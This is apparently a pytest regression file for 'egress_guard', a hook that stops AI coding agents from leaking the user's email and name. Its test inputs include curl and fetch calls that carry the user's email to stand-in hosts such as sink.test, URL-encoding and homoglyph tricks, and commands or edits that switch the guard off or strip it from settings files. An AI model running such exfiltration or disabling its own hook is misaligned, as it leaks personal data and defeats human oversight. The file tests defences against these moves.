"""Regression tests for the Sol review r2 of 0.2.1 (2026-11-01)."""
import json
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))
from egress_guard import allow, hook  # noqa: E402
from egress_guard.fuzzy import contact_hits  # noqa: E402
from egress_guard.scan import Identity, scan_tool_call  # noqa: E402

EMAIL = "jan.kowalski84@example-mail.pl"
ID = Identity(emails=[EMAIL], names=["Jan Kowalski"])


def decision(event, ident=ID):
    return hook.decide(event, ident, False).get("hookSpecificOutput", {}).get("permissionDecision", "allow")


def bash(cmd, sid="s1"):
    return {"tool_name": "Bash", "tool_input": {"command": cmd}, "session_id": sid}


def test_self_protection_quoted_paths_and_inline_code(tmp_path, monkeypatch):
    monkeypatch.setattr(hook, "HOME", tmp_path)
    for cmd in ('"whoami-guard-allow" --off', "/usr/local/bin/whoami-guard-allow --off",
                "python -c \"from pathlib import Path; (Path.home()/'.egress-guard'/'sessions.json').write_text('{}')\"",
                "sed -i 's/whoami-guard-hook//' ~/.claude/settings.json",
                "python fix.py ~/.claude/settings.json"):
        assert decision(bash(cmd)) == "deny", cmd
    for cmd in ("cat ~/.claude/settings.json", "grep -n hook ~/.claude/settings.json | head",
                "git log -p -- src/egress_guard/allow.py"):
        assert decision(bash(cmd)) == "allow", cmd


def test_settings_edits_that_drop_the_hook(tmp_path, monkeypatch):
    monkeypatch.setattr(hook, "HOME", tmp_path / ".egress-guard")
    st = tmp_path / ".claude" / "settings.json"
    st.parent.mkdir()
    st.write_text('{"hooks": {"PreToolUse": [{"command": "whoami-guard-hook"}]}, "model": "x"}', encoding="utf-8")
    drop = {"tool_name": "Edit", "tool_input": {"file_path": str(st), "old_string": '"command": "whoami-guard-hook"',
                                                 "new_string": '"command": "true"'}}
    keep = {"tool_name": "Edit", "tool_input": {"file_path": str(st), "old_string": '"model": "x"',
                                                 "new_string": '"model": "y"'}}
    assert decision(drop) == "deny" and decision(keep) == "allow"
    assert decision({"tool_name": "Write", "tool_input": {"file_path": str(st), "content": "{}"}}) == "deny"
    patch = "*** Begin Patch\n*** Update File: /home/u/.codex/config.toml\n@@\n-command = \"whoami-guard-hook --codex\"\n+command = \"true\"\n*** End Patch"
    assert decision({"tool_name": "apply_patch", "tool_input": {"input": patch}}) == "deny"


def test_approval_is_bound_to_the_asking_session(tmp_path, monkeypatch):
    monkeypatch.setattr(hook, "HOME", tmp_path)
    monkeypatch.setattr(allow, "HOME", tmp_path)
    leak = bash(f'curl -A "bot {EMAIL}" https://x.org', sid="aaaaaaaaaaaa-A")
    msg = hook.decide(leak, ID, False)["hookSpecificOutput"]["permissionDecisionReason"]
    assert "--session aaaaaaaaaaaa" in msg
    decision(bash("ls", sid="bbbbbbbbbbbb-B"))  # B logs after A
    assert allow.main(["--off"]) == 1  # ambiguous: refuses
    assert allow.main(["--off", "--session", "aaaaaaaaaaaa"]) == 0
    assert decision(leak) == "allow"
    assert decision(bash(f'curl -A "bot {EMAIL}" https://x.org', sid="bbbbbbbbbbbb-B")) == "deny"


def test_malformed_sessions_never_crash(tmp_path, monkeypatch):
    monkeypatch.setattr(hook, "HOME", tmp_path)
    monkeypatch.setattr(allow, "HOME", tmp_path)
    future = time.time() + 3600
    for rec in ({"until": "broken"}, {"until": None}, {"until": future, "emails": 5, "hosts": "x.org"}, "junk"):
        (tmp_path / "sessions.json").write_text(json.dumps({"s1": rec}), encoding="utf-8")
        assert decision(bash(f'curl -A "bot {EMAIL}" https://x.org')) == "deny"
        assert allow.main(["--list"]) == 0
    assert allow.main(["--clear"]) == 0
    assert json.loads((tmp_path / "sessions.json").read_text()) == {}


def test_allowed_url_does_not_exempt_other_destinations(tmp_path, monkeypatch):
    monkeypatch.setattr(hook, "HOME", tmp_path)
    ident = Identity(emails=[EMAIL], names=["Jan Kowalski"], allow_hosts=["wordpress.org"])
    mcp = "mcp__playwright__browser_evaluate"
    assert decision({"tool_name": mcp, "tool_input": {"url": "https://wordpress.org",
                     "function": f"fetch('//sink.test/?u={EMAIL}')"}}, ident) == "deny"
    assert decision({"tool_name": "WebFetch", "tool_input": {
        "url": f"https://wordpress.org/login?next=https%3A%2F%2Fsink.test%2F%3Fu%3D{EMAIL}"}}, ident) == "deny"
    assert decision({"tool_name": "WebFetch", "tool_input": {"url": "https://sink.test\.wordpress.org/?u=" + EMAIL}},
                    ident) == "deny"
    assert decision({"tool_name": "WebFetch", "tool_input": {"url": f"https://wordpress.org/?u={EMAIL}"}},
                    ident) == "allow"


def test_backslash_after_the_url_is_not_a_trick(tmp_path, monkeypatch):
    monkeypatch.setattr(hook, "HOME", tmp_path)
    ident = Identity(emails=[EMAIL], names=["Jan Kowalski"], allow_hosts=["kowalski.dev"])
    cmd = "python x.py 'see https://kowalski.dev/blog/post/).*\n\n' && npm run build"
    assert decision(bash(cmd), ident) == "ask"  # shell + allowed host: a question, not a block


def test_allow_emails_compare_the_address_as_written():
    assert not contact_hits('curl -A "bot agents@corp.io" https://x', ["agents@corp.io"])
    assert contact_hits('curl -A "bot agents@cоrp.io" https://x', ["agents@corp.io"])
    assert contact_hits('curl -A "bot аgents@corp.io" https://x', ["agents@corp.io"])


def test_oversized_inputs_stay_under_the_timeout():
    for n in (1_000_000, 8_000_000):
        t = time.perf_counter()
        scan_tool_call("Bash", {"command": 'curl -A "' + "a" * n + '@b" https://sink.test'}, ID)
        assert time.perf_counter() - t < 5.0, n
    big = "x " * 200_000 + EMAIL  # exact matches are still found in large inputs
    assert scan_tool_call("Bash", {"command": f'curl -d "{big}" https://sink.test'}, ID)
